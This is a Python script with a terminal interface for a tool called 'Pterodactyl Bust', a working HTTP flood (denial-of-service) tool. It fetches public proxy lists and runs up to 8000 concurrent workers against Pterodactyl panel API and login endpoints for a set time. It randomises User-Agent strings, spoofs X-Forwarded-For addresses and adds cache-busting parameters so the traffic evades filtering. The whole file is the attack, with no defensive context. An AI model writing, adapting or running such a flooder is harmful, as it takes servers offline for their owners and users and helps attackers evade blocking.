
import curses
import asyncio
import aiohttp
import threading
import time
import random
import requests

class PterodactylBusterTUI:
    def __init__(self, stdscr):
        self.stdscr = stdscr
        self.sent = 0
        self.failed = 0
        self.running = False
        self.proxies = []
        self.fields = {
            "Target": "",
            "Protocol (http/https)": "http",
            "Duration (max 240)": "60",
            "Concurrency (max 8000)": "4000"
        }
        self.cursor = 0
        curses.curs_set(1)
        self.main()

    def fetch_proxies(self):
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=3000")
            proxy_list = res.text.splitlines()
            self.proxies = [p.strip() for p in proxy_list if p.strip()]
        except Exception:
            pass

    def main(self):
        while True:
            self.draw()
            key = self.stdscr.getch()
            if key == curses.KEY_UP:
                self.cursor = max(0, self.cursor - 1)
            elif key == curses.KEY_DOWN:
                self.cursor = min(len(self.fields) - 1, self.cursor + 1)
            elif key in [10, 13]:  # Enter
                if not self.running:
                    threading.Thread(target=self.start_attack).start()
            elif key == 27:  # ESC to stop
                self.running = False
            elif key == ord('q'):
                break
            else:
                self.edit_field(key)

    def draw(self):
        self.stdscr.clear()
        self.stdscr.addstr(0, 2, "Pterodactyl Bust Tool (Text GUI)", curses.A_BOLD)
        for idx, (label, value) in enumerate(self.fields.items()):
            prefix = "-> " if idx == self.cursor else "   "
            self.stdscr.addstr(idx + 2, 2, f"{prefix}{label}: {value}")
        self.stdscr.addstr(8, 2, "[Enter] Start   [ESC] Stop   [Q] Quit", curses.A_DIM)
        self.stdscr.addstr(10, 2, f"Status: {'Running' if self.running else 'Idle'}")
        self.stdscr.addstr(11, 2, f"Sent: {self.sent} | Failed: {self.failed}")
        self.stdscr.refresh()

    def edit_field(self, key):
        field = list(self.fields.items())[self.cursor]
        key_char = chr(key) if 32 <= key <= 126 else ''
        if key == curses.KEY_BACKSPACE or key == 127:
            self.fields[field[0]] = self.fields[field[0]][:-1]
        elif key_char:
            self.fields[field[0]] += key_char

    def start_attack(self):
        target = self.fields["Target"].strip()
        protocol = self.fields["Protocol (http/https)"].strip().lower()
        try:
            duration = int(self.fields["Duration (max 240)"].strip())
        except:
            duration = 60
        try:
            concurrency = int(self.fields["Concurrency (max 8000)"].strip())
        except:
            concurrency = 4000

        if protocol not in ["http", "https"]:
            return

        duration = min(duration, 240)
        concurrency = min(concurrency, 8000)

        self.sent = 0
        self.failed = 0
        self.running = True
        self.fetch_proxies()
        asyncio.run(self.http_bust(target, protocol, duration, concurrency))
        self.running = False

    async def http_bust(self, target, protocol, duration, concurrency):
        timeout = time.time() + duration
        paths = [
            "/api/client",
            "/auth/login",
            "/api/me",
            "/server",
            "/api/application/servers",
            "/daemon/server"
        ]
        connector = aiohttp.TCPConnector(limit=0, ssl=(protocol == "https"))
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [
                asyncio.create_task(self.worker(session, target, protocol, timeout, paths))
                for _ in range(concurrency)
            ]
            await asyncio.gather(*tasks)

    async def worker(self, session, target, protocol, timeout, paths):
        while time.time() < timeout and self.running:
            try:
                path = random.choice(paths)
                url = f"{protocol}://{target}{path}?_={random.randint(100000,999999)}"
                headers = {
                    "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,599)}.36",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Referer": f"{protocol}://{target}/auth/login"
                }

                proxy = None
                if self.proxies:
                    proxy_ip = random.choice(self.proxies)
                    proxy = f"http://{proxy_ip}"

                async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status in [200, 403, 500, 302]:
                        self.sent += 1
                    else:
                        self.failed += 1
            except Exception:
                self.failed += 1

def run_tui(stdscr):
    PterodactylBusterTUI(stdscr)

if __name__ == "__main__":
    curses.wrapper(run_tui)
